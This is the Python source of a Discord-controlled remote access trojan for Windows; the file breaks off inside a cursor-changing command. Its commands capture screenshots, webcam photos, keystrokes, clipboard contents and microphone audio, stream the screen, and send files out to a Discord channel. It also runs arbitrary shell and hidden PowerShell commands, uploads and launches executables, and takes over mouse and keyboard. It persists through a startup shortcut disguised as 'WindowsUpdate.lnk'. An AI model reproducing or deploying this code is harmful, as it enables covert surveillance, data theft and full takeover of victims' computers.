import discord
import asyncio
import pyautogui
import cv2
import requests
import socket
import subprocess
import atexit
import psutil
from discord.ext import commands
from pynput import keyboard
from io import BytesIO
import numpy as np
import mss
import os
import threading
from discord import ButtonStyle
from discord.ui import View, Button
import time
import win32
import winreg
import win32com.client
import sys
import shutil
from discord.ui import View, Select, Button
from discord import SelectOption, Interaction, File
import io
import sounddevice as sd
import pyperclip
from PIL import ImageFont
import imageio_ffmpeg
import tkinter as tk
import platform
import datetime
import pyttsx3
import tempfile
import random
import re
from discord.ext import commands
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from PIL import Image, ImageDraw, ImageTk
from ctypes import POINTER, cast
from comtypes import CLSCTX_ALL
import screen_brightness_control as sbc
import ctypes
import urllib.request
import signal
import setproctitle
import certifi

os.environ['SSL_CERT_FILE'] = certifi.where()

FFMPEG_PATH = imageio_ffmpeg.get_ffmpeg_exe()
# ---------------------------------------------------------------------------
VOICE_CHANNEL_ID = 00000000000000000000 # Replace with your voice channel ID
READY_ID = 00000000000000000000 # Replace with your channel ID
# ---------------------------------------------------------------------------

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

keystroke_logging_enabled = False
keystroke_log = []

clist = """
**Available Commands:** 
- `!ss`: Take a screenshot
- `!ip`: Get public IP address
- `!web`: Take a webcam photo
- `!log`: Start keystroke logging
- `!slog`: Stop keystroke logging and send log
- `!listf [path]`: List files in a directory (default is current directory)
- `!shutdown`: Shutdown the computer
- `!cmd [command]`: Execute a shell command
- `!stream`: Start streaming the screen
- `!stopstream`: Stop the current screen stream
- `!hardware`: Get detailed hardware information
- `!cmdlist`: List available commands
- `!autostart`: Add this script to Windows startup
- `!upload`: Upload files from Discord to the machine
- `!ps [command]`: Run a PowerShell command silently
- `!joinmic`: Join a voice channel and stream mic input
- `!stopmic`: Stop mic streaming
- `!control move [x] [y]`: Move mouse to (x, y)
- `!control click [left/right/middle]`: Click mouse button
- `!control type [text]`: Type out text
- `!control press [key]`: Press a single key
- `!control hold [key]`: Hold down a key (use !control release to release it)
- `!control release [key]`: Release a held key
- `!clipboard`: View clipboard content
- `!clipboard set [text]`: Set clipboard content
- `!clipboard clear`: Clear clipboard content
- `!proclist`: List running processes
- `!prockill [pid_or_process_name]`: Kill a process by PID or name
- `!systeminfo`: Show system info that updates every 10 seconds
- `!tts [text]`: Text-to-speech command to speak text aloud
- `!mouse_prank [duration] [interval] [distance]`: Shake or randomly move the mouse for a duration
- `!specialkeylist`: List special keys for use in macros
- `!keymacro [macro_script]`: Execute a key macro script (e.g. `{enter}`, `{ctrl+a}`)
- `!volume [level]`: Adjust system master volume (0-100)
- `!brightness [level]`: Adjust screen brightness (0-100)
- `!cpu_stress [duration]`: Stress CPU for a duration in seconds
"""

clist2 = """
- `!getipconfig`: Get IP configuration details
- `!vpnstatus`: Check VPN status
- `!setcursor [url/image]`: Change cursor's image
- `!draw [shape] [coordinates]`: Draw shapes on the screen
- `!draw text [x,y][text]`: Draw text on the screen"""

streaming_active = False  # Flag to control screen streaming loop

def on_press(key):
    global keystroke_log
    if keystroke_logging_enabled:
        keystroke_log.append(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()


@bot.event
async def on_ready():
    custom_process_name()
    print(f'Bot is ready. Logged in as {bot.user}')
    channel = bot.get_channel(READY_ID)
    if channel:
        await channel.send("Connected")
        await channel.send(clist)
        await channel.send(clist2)

def custom_process_name():
    setproctitle.setproctitle("MyCustomProcessName")

@bot.command()
async def specialkeylist(ctx):
    """
    List special keys that can be used in macros.
    """
    special_keys = [
        "{enter}", "{esc}", "{tab}", "{backspace}", "{space}",
        "{up}", "{down}", "{left}", "{right}",
        "{ctrl}", "{alt}", "{shift}", "{win}",
        "{f1}", "{f2}", "{f3}", "{f4}", "{f5}",
        "{f6}", "{f7}", "{f8}", "{f9}", "{f10}",
        "{f11}", "{f12}"
    ]
    await ctx.send("**Special Keys for Macros:**\n" + "\n".join(special_keys))

@bot.command()
async def ss(ctx):
    await ctx.send("Taking screenshot...")
    screenshot = pyautogui.screenshot()
    screenshot_io = BytesIO()
    screenshot.save(screenshot_io, format='PNG')
    screenshot_io.seek(0)
    await ctx.send(file=discord.File(screenshot_io, filename='screenshot.png'))

@bot.command()
async def ip(ctx):
    ip_address = requests.get('https://api.ipify.org').text
    await ctx.send(f'IP Address: {ip_address}')

@bot.command()
async def web(ctx):
    await ctx.send("Taking webcam photo...")
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        is_success, buffer = cv2.imencode('.png', frame)
        if is_success:
            file_like_object = BytesIO(buffer)
            await ctx.send(file=discord.File(file_like_object, filename='webcam_photo.png'))
        cap.release()
    else:
        await ctx.send("Failed to capture image.")

@bot.command()
async def log(ctx):
    global keystroke_logging_enabled
    keystroke_logging_enabled = True
    await ctx.send("Keystroke logging started.")

@bot.command()
async def slog(ctx):
    global keystroke_logging_enabled, keystroke_log
    keystroke_logging_enabled = False
    log_message = "\n".join(keystroke_log)
    await ctx.send(f"Keystroke log:\n{log_message}")
    keystroke_log = []

@bot.command()
async def ps(ctx, *, command):
    """
    Run a PowerShell command silently and return the output.
    NOTE: This does NOT elevate privileges automatically.
    The script must be run as admin for elevated commands.
    """
    await ctx.send(f"Running PowerShell command: `{command}`")

    try:
        # Run powershell command silently (hidden window)
        completed = subprocess.run(
            ["powershell", "-NoProfile", "-Command", command],
            capture_output=True,
            text=True,
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW  # hides the window
        )

        output = completed.stdout.strip()
        error = completed.stderr.strip()

        if output:
            await ctx.send(f"Output:\n```\n{output}\n```")
        if error:
            await ctx.send(f"Error:\n```\n{error}\n```")
        if not output and not error:
            await ctx.send("No output returned.")

    except Exception as e:
        await ctx.send(f"Failed to run PowerShell command:\n```{e}```")

class FileExplorerView(View):
    def __init__(self, ctx, start_path='.', page=0):
        super().__init__(timeout=300)
        self.ctx = ctx
        self.current_path = os.path.abspath(start_path)
        self.page = page
        self.entries = []
        self.message = None
        self.per_page = 10  # Number of file/folder buttons per page
        self.update_entries()
        self.update_buttons()

    def update_entries(self):
        try:
            entries = os.listdir(self.current_path)
        except PermissionError:
            entries = []
        self.entries = sorted(entries, key=lambda e: (not os.path.isdir(os.path.join(self.current_path, e)), e.lower()))

    def update_buttons(self):
        self.clear_items()

        # Add "Back" button if not at root
        if os.path.dirname(self.current_path) != self.current_path:
            self.add_item(Button(label='⬅️ Back', style=ButtonStyle.secondary, custom_id='__back__'))

        start_index = self.page * self.per_page
        end_index = start_index + self.per_page
        for entry in self.entries[start_index:end_index]:
            full_path = os.path.join(self.current_path, entry)
            label = f"[DIR] {entry}" if os.path.isdir(full_path) else entry
            style = ButtonStyle.primary if os.path.isdir(full_path) else ButtonStyle.secondary
            self.add_item(Button(label=label[:80], style=style, custom_id=entry))

        # Pagination controls
        if self.page > 0:
            self.add_item(Button(label='⬅️ Prev Page', style=ButtonStyle.success, custom_id='__prev__'))
        if end_index < len(self.entries):
            self.add_item(Button(label='➡️ Next Page', style=ButtonStyle.success, custom_id='__next__'))

    async def send_or_update(self, interaction):
        embed = discord.Embed(
            title="📁 File Explorer",
            description=f"**Current Path:** `{self.current_path}`\n**Page:** {self.page + 1}/{(len(self.entries) - 1) // self.per_page + 1}",
            color=discord.Color.blurple()
        )

        start_index = self.page * self.per_page
        end_index = start_index + self.per_page
        contents = ""
        for entry in self.entries[start_index:end_index]:
            full_path = os.path.join(self.current_path, entry)
            icon = "📁" if os.path.isdir(full_path) else "📄"
            contents += f"{icon} `{entry}`\n"

        if not contents:
            contents = "*Empty or restricted access.*"

        embed.add_field(name="Contents", value=contents, inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

    async def interaction_check(self, interaction):
        selected = interaction.data.get('custom_id')

        if selected == '__back__':
            self.current_path = os.path.dirname(self.current_path)
            self.page = 0
            self.update_entries()
        elif selected == '__next__':
            self.page += 1
        elif selected == '__prev__':
            self.page -= 1
        else:
            selected_path = os.path.join(self.current_path, selected)
            if os.path.isdir(selected_path):
                self.current_path = selected_path
                self.page = 0
                self.update_entries()
            else:
                try:
                    file = discord.File(selected_path)
                    await interaction.response.send_message(
                        f"📤 Sending file: `{selected}`",
                        file=file,
                        ephemeral=True
                    )
                    return False
                except Exception as e:
                    await interaction.response.send_message(
                        f"❌ Failed to send file: `{selected}`\n`{e}`",
                        ephemeral=True
                    )
                    return False

        self.update_buttons()
        await self.send_or_update(interaction)
        return True


@bot.command()
async def listf(ctx, path='.'):
    """Interactive file explorer with pagination"""
    view = FileExplorerView(ctx, start_path=path)
    embed = discord.Embed(
        title="📁 File Explorer",
        description=f"**Current Path:** `{os.path.abspath(path)}`",
        color=discord.Color.blurple()
    )
    view.message = await ctx.send(embed=embed, view=view)


@bot.command()
async def autostart(ctx):
    """
    Adds this script to Windows startup.
    """
    try:
        # Get the current script path
        script_path = os.path.abspath(sys.argv[0])
        # Get path to startup folder
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        # Name of the shortcut
        shortcut_path = os.path.join(startup_dir, "WindowsUpdate.lnk")

        # Create the shortcut
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = sys.executable
        shortcut.Arguments = f'"{script_path}"'
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = sys.executable
        shortcut.save()

        await ctx.send("✅ Successfully added to startup.")
    except Exception as e:
        await ctx.send(f"❌ Failed to add to startup:\n```{e}```")

@bot.command()
async def shutdown(ctx):
    await ctx.send("Shutting down the computer...")
    subprocess.run('shutdown /s /f /t 0', shell=True)

@bot.command()
async def cmd(ctx, *, command):
    await ctx.send("Executing command...")
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    await ctx.send(f"Command output:\n{result.stdout}\n{result.stderr}")

@bot.command()
async def cmdlist(ctx):
    """
    List available commands.
    """
    await ctx.send(clist)

SAMPLE_RATE = 48000
CHANNELS = 2

def resource_path(filename):
    """Get absolute path to resource, works for dev and PyInstaller exe."""
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.abspath("."), filename)

def load_opus():
    if not discord.opus.is_loaded():
        opus_path = resource_path("libopus-0.dll")
        if os.path.isfile(opus_path):
            discord.opus.load_opus(opus_path)
            print(f"[INFO] Opus loaded from {opus_path}")
        else:
            print(f"[ERROR] Opus DLL not found at {opus_path}")

def find_active_mic():
    devices = sd.query_devices()
    for idx, dev in enumerate(devices):
        if dev['max_input_channels'] > 0:
            try:
                data = sd.rec(int(0.2 * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1, dtype='float32', device=idx)
                sd.wait()
                if np.abs(data).mean() > 0.005:
                    print(f"[INFO] Active mic found: {dev['name']} (index {idx})")
                    return idx
            except Exception:
                pass
    print("[WARN] No active mic detected, using default.")
    return None

class MicAudio(discord.AudioSource):
    def __init__(self, mic_index=None):
        self.stream = sd.RawInputStream(
            samplerate=SAMPLE_RATE,
            channels=CHANNELS,
            dtype='int16',
            device=mic_index,
            blocksize=960,
        )
        self.stream.start()

    def read(self):
        data, _ = self.stream.read(960)
        return bytes(data)

    def is_opus(self):
        return False

@bot.command()
async def joinmic(ctx):
    load_opus()

    channel = bot.get_channel(VOICE_CHANNEL_ID)
    if not channel or not isinstance(channel, discord.VoiceChannel):
        await ctx.send("❌ Invalid voice channel ID.")
        return

    vc = await channel.connect()
    mic_index = find_active_mic()
    audio_source = MicAudio(mic_index)
    vc.play(audio_source)
    await ctx.send(f"🎙️ Streaming mic from `{sd.query_devices(mic_index)['name'] if mic_index is not None else 'Default Device'}`.")

@bot.command()
async def stopmic(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("🛑 Disconnected from VC.")


streaming_active = False
stream_message = None  # Keep track of the message to edit

async def update_embed(embed, message):
    global streaming_active
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while streaming_active:
            screenshot = np.array(sct.grab(monitor))
            screenshot = cv2.cvtColor(screenshot, cv2.COLOR_BGRA2BGR)
            is_success, buffer = cv2.imencode('.jpg', screenshot)
            if is_success:
                file_like_object = BytesIO(buffer)
                file_like_object.seek(0)
                file = discord.File(file_like_object, filename='stream.jpg')
                embed.set_image(url="attachment://stream.jpg")
                try:
                    await message.edit(embed=embed, attachments=[file])
                except discord.HTTPException:
                    # Ignore if editing too fast or other minor HTTP errors
                    pass
                await asyncio.sleep(0.15)  # Throttle updates to avoid rate limits

@bot.command()
async def stream(ctx):
    global streaming_active, stream_message
    if streaming_active:
        await ctx.send("Stream is already active.")
        return

    streaming_active = True
    embed = discord.Embed(title="Screen Stream", color=discord.Color.blue())
    stream_message = await ctx.send(embed=embed)

    # Start the update_embed task in the background
    bot.loop.create_task(update_embed(embed, stream_message))

@bot.command()
async def stopstream(ctx):
    global streaming_active
    if not streaming_active:
        await ctx.send("Stream is not currently active.")
        return

    streaming_active = False
    await ctx.send("Screen stream has been stopped.")

@bot.command()
async def hardware(ctx):
    """
    Command to list detailed hardware information.
    """
    await ctx.send("Gathering hardware info...")

    cpu_info = f"CPU Cores: {psutil.cpu_count(logical=False)} Physical, {psutil.cpu_count(logical=True)} Logical"
    cpu_freq = psutil.cpu_freq()
    cpu_freq_info = f"CPU Frequency: {cpu_freq.current:.2f} MHz (Min: {cpu_freq.min}, Max: {cpu_freq.max})"

    memory = psutil.virtual_memory()
    memory_info = f"Memory: {memory.total // (1024 ** 2)} MB total, {memory.available // (1024 ** 2)} MB available"

    disk_info = "\n".join([f"{dp.device} - {dp.mountpoint} - {dp.fstype}" for dp in psutil.disk_partitions()])

    net_info = "\n".join([f"{iface}: {'Up' if stats.isup else 'Down'}" for iface, stats in psutil.net_if_stats().items()])

    hardware_report = (
        f"**🧠 CPU Info:**\n{cpu_info}\n{cpu_freq_info}\n\n"
        f"**💾 Memory Info:**\n{memory_info}\n\n"
        f"**🗃️ Disk Partitions:**\n{disk_info}\n\n"
        f"**🌐 Network Interfaces:**\n{net_info}"
    )

    # Discord message limit is 2000 chars; split if needed
    if len(hardware_report) > 1990:
        for chunk in [hardware_report[i:i+1900] for i in range(0, len(hardware_report), 1900)]:
            await ctx.send(chunk)
    else:
        await ctx.send(hardware_report)

class DirectoryBrowser(View):
    def __init__(self, ctx, start_path):
        super().__init__(timeout=120)
        self.ctx = ctx
        self.current_path = os.path.abspath(start_path)
        self.selected_path = None
        self.message = None
        self.update_buttons()

    def update_buttons(self):
        self.clear_items()
        # Back button if not root
        if os.path.dirname(self.current_path) != self.current_path:
            self.add_item(Button(label="⬅️ Back", style=ButtonStyle.secondary, custom_id="back"))

        # List directories only (limit to first 8)
        try:
            entries = [e for e in os.listdir(self.current_path) if os.path.isdir(os.path.join(self.current_path, e))]
        except PermissionError:
            entries = []

        entries.sort()
        for folder in entries[:8]:
            self.add_item(Button(label=folder, style=ButtonStyle.primary, custom_id=folder))

        # Select current folder button
        self.add_item(Button(label="📁 Select This Folder", style=ButtonStyle.success, custom_id="select"))

    async def interaction_check(self, interaction: Interaction) -> bool:
        return interaction.user == self.ctx.author

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        if self.message:
            await self.message.edit(view=self)

    @discord.ui.button(label="Dummy", style=ButtonStyle.secondary, custom_id="dummy", row=1)
    async def dummy_button(self, interaction: Interaction, button: Button):
        # Just a placeholder; we won't actually use this button
        pass

    async def interaction_handler(self, interaction: Interaction):
        custom_id = interaction.data['custom_id']

        if custom_id == "back":
            self.current_path = os.path.dirname(self.current_path)
            self.update_buttons()
            await interaction.response.edit_message(content=f"Browsing: `{self.current_path}`", view=self)

        elif custom_id == "select":
            self.selected_path = self.current_path
            await interaction.response.send_message(f"✅ Selected folder: `{self.selected_path}`", ephemeral=True)
            self.stop()

        else:  # folder name clicked
            new_path = os.path.join(self.current_path, custom_id)
            if os.path.isdir(new_path):
                self.current_path = new_path
                self.update_buttons()
                await interaction.response.edit_message(content=f"Browsing: `{self.current_path}`", view=self)
            else:
                await interaction.response.send_message("❌ Not a valid folder.", ephemeral=True)

    async def on_error(self, error, item, interaction):
        await interaction.response.send_message(f"Error: {error}", ephemeral=True)

    # Override interaction callback to route to our handler
    async def interaction_check(self, interaction: Interaction):
        await self.interaction_handler(interaction)
        return True


@bot.command()
async def upload(ctx):
    """
    Upload files, browse folders interactively to choose save directory,
    and optionally run executables.
    """
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach at least one file.")
        return

    browser = DirectoryBrowser(ctx, start_path=os.getcwd())
    msg = await ctx.send(f"📂 Browse folders to select save location:\n`{os.getcwd()}`", view=browser)
    browser.message = msg
    await browser.wait()

    if browser.selected_path is None:
        await ctx.send("⏱️ Timeout or no folder selected. Canceling upload.")
        return

    save_path = browser.selected_path
    saved_files = []

    for attachment in ctx.message.attachments:
        file_bytes = await attachment.read()
        full_save_path = os.path.join(save_path, attachment.filename)

        try:
            with open(full_save_path, 'wb') as f:
                f.write(file_bytes)
            saved_files.append((attachment.filename, full_save_path))
            await ctx.send(f"✅ Saved `{attachment.filename}` to `{save_path}`")
        except Exception as e:
            await ctx.send(f"❌ Failed to save `{attachment.filename}`:\n```{e}```")

    for filename, full_path in saved_files:
        if filename.endswith(('.exe', '.bat', 'vbs', '.cmd', 'vb', 'png', '.jpg', '.jpeg', '.gif', 'mp4', '.mp3', '.wav', '.avi', '.mkv', '.ogg', '.flv', '.mov', '.webm')):
            class RunConfirmView(View):
                def __init__(self, path):
                    super().__init__(timeout=20)
                    self.path = path

                @discord.ui.button(label="Run", style=discord.ButtonStyle.success)
                async def run_button(self, interaction: Interaction, button: Button):
                    try:
                        subprocess.Popen(self.path, shell=True)
                        await interaction.response.send_message(f"🚀 Executed `{filename}`", ephemeral=True)
                    except Exception as e:
                        await interaction.response.send_message(f"❌ Failed to execute `{filename}`:\n```{e}```", ephemeral=True)
                    self.stop()

                @discord.ui.button(label="Cancel", style=discord.ButtonStyle.danger)
                async def cancel_button(self, interaction: Interaction, button: Button):
                    await interaction.response.send_message("⏭️ Execution canceled.", ephemeral=True)
                    self.stop()

            view = RunConfirmView(full_path)
            await ctx.send(f"⚠️ `{filename}` is executable. Run it?", view=view)

@bot.group(invoke_without_command=True)
async def control(ctx):
    await ctx.send("Use subcommands: move, click, type, press, release")

@control.command()
async def move(ctx, x: int, y: int):
    """Move mouse to (x, y)"""
    pyautogui.moveTo(x, y)
    await ctx.send(f"Moved mouse to ({x}, {y})")

@control.command()
async def click(ctx, button: str = "left"):
    """Click mouse button: left, right, or middle"""
    if button not in ("left", "right", "middle"):
        await ctx.send("Invalid button! Choose: left, right, middle")
        return
    pyautogui.click(button=button)
    await ctx.send(f"Clicked {button} mouse button")

@control.command()
async def type(ctx, *, text: str):
    """Type out text"""
    pyautogui.typewrite(text)
    await ctx.send(f"Typed out: {text}")

@control.command()
async def press(ctx, key: str):
    """Press a single key"""
    try:
        pyautogui.keyDown(key)
        pyautogui.keyUp(key)
        await ctx.send(f"Pressed key: {key}")
    except Exception as e:
        await ctx.send(f"Error pressing key '{key}': {e}")

@control.command()
async def hold(ctx, key: str):
    """Hold down a key (use !control release to release it)"""
    try:
        pyautogui.keyDown(key)
        await ctx.send(f"Held down key: {key}")
    except Exception as e:
        await ctx.send(f"Error holding key '{key}': {e}")

@control.command()
async def release(ctx, key: str):
    """Release a held key"""
    try:
        pyautogui.keyUp(key)
        await ctx.send(f"Released key: {key}")
    except Exception as e:
        await ctx.send(f"Error releasing key '{key}': {e}")

@bot.group(invoke_without_command=True)
async def clipboard(ctx):
    """View or edit the clipboard."""
    current = pyperclip.paste()
    if current:
        await ctx.send(f"📋 Current clipboard content:\n```\n{current}\n```")
    else:
        await ctx.send("📋 Clipboard is empty.")

@clipboard.command(name="set")
async def clipboard_set(ctx, *, text: str):
    """Set clipboard content."""
    pyperclip.copy(text)
    await ctx.send(f"✅ Clipboard updated with:\n```\n{text}\n```")

@clipboard.command(name="clear")
async def clipboard_clear(ctx):
    """Clear the clipboard content."""
    pyperclip.copy("")
    await ctx.send("✅ Clipboard cleared.")

@bot.command(name="proclist")
async def process_list(ctx):
    """List running processes (PID and name)."""
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            info = proc.info
            processes.append(f"{info['pid']}: {info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    # Send process list in chunks if too long
    chunk_size = 20
    for i in range(0, len(processes), chunk_size):
        chunk = processes[i:i+chunk_size]
        message = "```\n" + "\n".join(chunk) + "\n```"
        await ctx.send(message)

@bot.command(name="prockill")
async def process_kill(ctx, *, identifier: str):
    """
    Kill a process by PID or name.
    Usage: !prockill <pid_or_process_name>
    """
    # Try kill by PID
    if identifier.isdigit():
        pid = int(identifier)
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            await ctx.send(f"✅ Terminated process PID {pid} ({proc.name()})")
        except psutil.NoSuchProcess:
            await ctx.send(f"❌ No process with PID {pid}")
        except psutil.AccessDenied:
            await ctx.send(f"❌ Access denied to terminate PID {pid}")
        return

    # Try kill by name (kill all matching)
    killed = 0
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and identifier.lower() in proc.info['name'].lower():
                proc.terminate()
                killed += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    if killed > 0:
        await ctx.send(f"✅ Terminated {killed} processes matching '{identifier}'")
    else:
        await ctx.send(f"❌ No processes matching '{identifier}' found")

_systeminfo_tasks = {}  # store tasks per user to allow multiple concurrent updates

def get_system_info():
    cpu_percent = psutil.cpu_percent(interval=None)
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
    uptime = datetime.datetime.now() - boot_time
    os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
    try:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
    except:
        ip_addr = "Unknown"

    embed = discord.Embed(title="🖥️ System Information", color=discord.Color.green(), timestamp=datetime.datetime.utcnow())

    embed.add_field(name="CPU Usage", value=f"{cpu_percent}%", inline=True)
    embed.add_field(name="RAM Usage", value=f"{mem.percent}% ({round(mem.used / (1024**3), 2)} GB / {round(mem.total / (1024**3), 2)} GB)", inline=True)
    embed.add_field(name="Disk Usage", value=f"{disk.percent}% ({round(disk.used / (1024**3), 2)} GB / {round(disk.total / (1024**3), 2)} GB)", inline=True)
    embed.add_field(name="Uptime", value=str(uptime).split('.')[0], inline=True)
    embed.add_field(name="IP Address", value=ip_addr, inline=True)
    embed.add_field(name="OS", value=os_info, inline=True)

    embed.set_footer(text="System info updates every 10 seconds")

    return embed

async def periodic_update(message, user_id):
    while True:
        embed = get_system_info()
        try:
            await message.edit(embed=embed)
        except discord.HTTPException:
            pass
        await asyncio.sleep(.5)

@bot.command()
async def systeminfo(ctx):
    """
    Shows system info that updates every 10 seconds.
    """
    if ctx.author.id in _systeminfo_tasks:
        await ctx.send("System info is already being displayed for you.")
        return

    embed = get_system_info()
    message = await ctx.send(embed=embed)

    task = bot.loop.create_task(periodic_update(message, ctx.author.id))
    _systeminfo_tasks[ctx.author.id] = task

    # Optionally: stop updates after a certain time (e.g. 5 minutes)
    async def stop_task_after_delay():
        await asyncio.sleep(300)
        task.cancel()
        _systeminfo_tasks.pop(ctx.author.id, None)
        try:
            await message.edit(content="System info update stopped.", embed=None)
        except discord.HTTPException:
            pass

    bot.loop.create_task(stop_task_after_delay())

@bot.command()
async def tts(ctx, *, text: str):
    try:
        engine = pyttsx3.init()
        engine.setProperty('rate', 175)  # speaking speed
        engine.setProperty('volume', 1.0)  # max volume

        # Create a temp file for audio output
        with tempfile.NamedTemporaryFile(delete=False, suffix=".mp3") as tmp_file:
            temp_path = tmp_file.name
        
        engine.save_to_file(text, temp_path)
        engine.runAndWait()

        # Play on the client machine
        if os.name == "nt":  # Windows
            os.system(f'start /min wmplayer "{temp_path}"')
        else:  # Linux/Mac fallback
            os.system(f'xdg-open "{temp_path}"')

        await ctx.send(f"🔊 Speaking: `{text}`")

    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def mouse_prank(ctx, duration: int = 5, interval: float = 0.1, distance: int = 50):
    """
    Shake or randomly move the mouse for a duration.
    :param duration: How long to run the prank (seconds)
    :param interval: Time between moves (seconds)
    :param distance: Max pixels to move in one step
    """
    await ctx.send(f"🎯 Starting mouse prank for {duration} seconds...")

    end_time = asyncio.get_event_loop().time() + duration
    while asyncio.get_event_loop().time() < end_time:
        # Get current mouse position
        x, y = pyautogui.position()
        # Add a random offset
        dx = random.randint(-distance, distance)
        dy = random.randint(-distance, distance)
        # Move mouse
        pyautogui.moveTo(x + dx, y + dy, duration=0.05)
        await asyncio.sleep(interval)

    await ctx.send("✅ Mouse prank finished!")

def execute_macro(script):
    # Matches things like {enter}, {ctrl+a}, etc.
    pattern = re.compile(r'\{(.*?)\}')
    parts = pattern.split(script)

    for i, part in enumerate(parts):
        if i % 2 == 0:
            # Regular text
            if part.strip():
                pyautogui.typewrite(part)
        else:
            # Special key
            key_combo = part.lower()
            if '+' in key_combo:
                keys = key_combo.split('+')
                pyautogui.hotkey(*keys)
            else:
                pyautogui.press(key_combo)

@bot.command()
async def keymacro(ctx, *, macro_script: str):
    await ctx.send(f"Executing macro: `{macro_script}`")
    time.sleep(1)  # Small delay before execution
    execute_macro(macro_script)
    await ctx.send("Macro finished.")

@bot.command()
async def volume(ctx, level: int):
    """
    Adjust system master volume (0-100).
    """
    if level < 0 or level > 100:
        await ctx.send("❌ Volume level must be between 0 and 100.")
        return
    
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    
    # Set volume level (scale 0.0 to 1.0)
    volume_level = level / 100
    volume.SetMasterVolumeLevelScalar(volume_level, None)
    
    await ctx.send(f"🔊 Volume set to {level}%.")

@bot.command()
async def brightness(ctx, level: int):
    """
    Adjust screen brightness (0-100).
    """
    if level < 0 or level > 100:
        await ctx.send("❌ Brightness level must be between 0 and 100.")
        return
    
    try:
        sbc.set_brightness(level)
        await ctx.send(f"💡 Brightness set to {level}%.")
    except Exception as e:
        await ctx.send(f"❌ Failed to set brightness: {e}")

@bot.command()
async def cpu_stress(ctx, duration: int):
    """Run a CPU stress test for <duration> seconds."""
    await ctx.send(f"⚙️ Starting CPU stress test for {duration} seconds...")

    def cpu_load():
        # Busy loop to max CPU usage
        while True:
            pass

    # Launch one busy thread per CPU core
    import threading
    import multiprocessing

    cores = multiprocessing.cpu_count()
    threads = []
    stop_flag = False

    def stress_thread():
        while not stop_flag:
            pass

    for _ in range(cores):
        t = threading.Thread(target=stress_thread)
        t.start()
        threads.append(t)

    # Sleep asynchronously while CPU stress runs
    await asyncio.sleep(duration)

    # Signal threads to stop
    stop_flag = True

    for t in threads:
        t.join()

    await ctx.send(f"✅ CPU stress test completed after {duration} seconds.")

@bot.command()
async def getipconfig(ctx):
    """
    Show IP, Gateway and DNS info using netifaces.
    """
    import netifaces

    msg = ""
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        ipv4 = addrs.get(netifaces.AF_INET)
        gw = netifaces.gateways()
        dns_servers = []
        # On Windows, DNS servers are usually in registry or use socket.getaddrinfo()

        msg += f"**Interface:** {iface}\n"
        if ipv4:
            for addr in ipv4:
                msg += f"IP Address: {addr['addr']}\n"
                msg += f"Netmask: {addr.get('netmask', 'N/A')}\n"
        # Gateways
        default_gw = gw.get('default', {}).get(netifaces.AF_INET)
        if default_gw:
            msg += f"Default Gateway: {default_gw[0]}\n"

        # DNS is tricky cross platform, so just add a placeholder:
        msg += f"DNS Servers: (Please check locally)\n\n"

    if len(msg) > 2000:
        for chunk in [msg[i:i+2000] for i in range(0, len(msg), 2000)]:
            await ctx.send(f"```\n{chunk}\n```")
    else:
        await ctx.send(f"```\n{msg}\n```")

@bot.command()
async def vpnstatus(ctx):
    """
    Simple heuristic to detect VPN by interface name or IP ranges.
    """
    import psutil
    vpn_keywords = ['vpn', 'tap', 'tun', 'ppp', 'pptp', 'openvpn', 'wireguard']

    addrs = psutil.net_if_addrs()
    found_vpn = False
    vpn_ifaces = []

    for iface_name, iface_addrs in addrs.items():
        if any(keyword in iface_name.lower() for keyword in vpn_keywords):
            found_vpn = True
            vpn_ifaces.append(iface_name)
            continue
        for addr in iface_addrs:
            if addr.family == socket.AF_INET:
                ip = addr.address
                # Check for private IP ranges common for VPNs (heuristic)
                if ip.startswith('10.') or ip.startswith('172.') or ip.startswith('192.168.'):
                    # Local networks, might be VPN or LAN, skip
                    continue
                else:
                    # Public IP on non-primary iface could be VPN
                    found_vpn = True
                    vpn_ifaces.append(iface_name)

    if found_vpn:
        await ctx.send(f"🛡️ VPN interfaces detected: {', '.join(vpn_ifaces)}")
    else:
        await ctx.send("❌ No VPN interfaces detected.")

@bot.command()
async def setcursor(ctx, url: str):
    """
    Download a cursor file (.cur or .ani) from URL and set it as system cursor.
    """
    SPI_SETCURSORS = 0x0057
    # Paths
    cursor_path = os.path.join(os.getenv('TEMP'), "discord_custom_cursor.cur")

    try:
        # Download cursor file
        urllib.request.urlretrieve(url, cursor_path)
    except Exception as e:
        await ctx.send(f"❌ Failed to download cursor file: {e}")
        return

    # Load cursor and set as default arrow cursor (OCR_NORMAL)
    OCR_NORMAL = 32512
    if not os.path.exists(cursor_path):
        await ctx.send("❌ Cursor file does not exist after download.")
        return

    # Set system cursor
